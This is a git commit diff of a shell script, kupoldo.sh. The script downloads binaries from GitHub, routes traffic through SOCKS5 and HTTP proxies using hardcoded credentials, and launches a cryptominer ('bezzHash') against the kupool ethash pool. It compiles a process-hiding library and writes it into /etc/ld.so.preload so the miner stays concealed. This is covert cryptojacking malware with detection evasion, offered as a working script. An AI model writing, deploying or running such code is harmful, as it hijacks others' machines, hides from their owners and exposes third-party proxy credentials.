f668d5fa65abde6dd50209f58dfffde10e6d4122
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 02:59:20 +0700

    Update kupoldo.sh

--- kupoldo.sh
+++ kupoldo.sh
@@ -1,14 +1,44 @@
-#!/bin/bash
-curl --proxy "http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80/" https://ipv4.webshare.io/
-export http_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
-export https_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
-export ftp_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+#!/bin/sh
+sleep 20m
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-TEST)@ethash.kupool.com:443 > nohup.out
+
+./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-THOR)@ethash.kupool.com:443
